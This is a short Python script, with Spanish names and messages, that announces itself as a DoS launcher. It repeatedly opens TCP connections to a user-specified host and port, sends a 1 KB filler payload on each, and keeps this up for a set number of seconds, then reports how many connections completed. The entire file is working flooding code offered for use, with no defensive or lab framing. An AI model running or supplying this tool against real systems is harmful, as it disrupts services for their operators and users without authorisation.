import argparse
import socket
import time


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--destino", required=True)
    parser.add_argument("--puerto", type=int, required=True)
    parser.add_argument("--duracion", type=int, default=20)
    args = parser.parse_args()

    print(f"Lanzando DoS hacia {args.destino}:{args.puerto} por {args.duracion}s")

    payload = b"A" * 1024
    fin = time.time() + args.duracion
    contador = 0

    while time.time() < fin:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((args.destino, args.puerto))
            s.send(payload)
            s.close()
            contador += 1
        except Exception:
            pass

    print(f"Ataque finalizado. Conexiones completadas: {contador}")


if __name__ == "__main__":
    main()
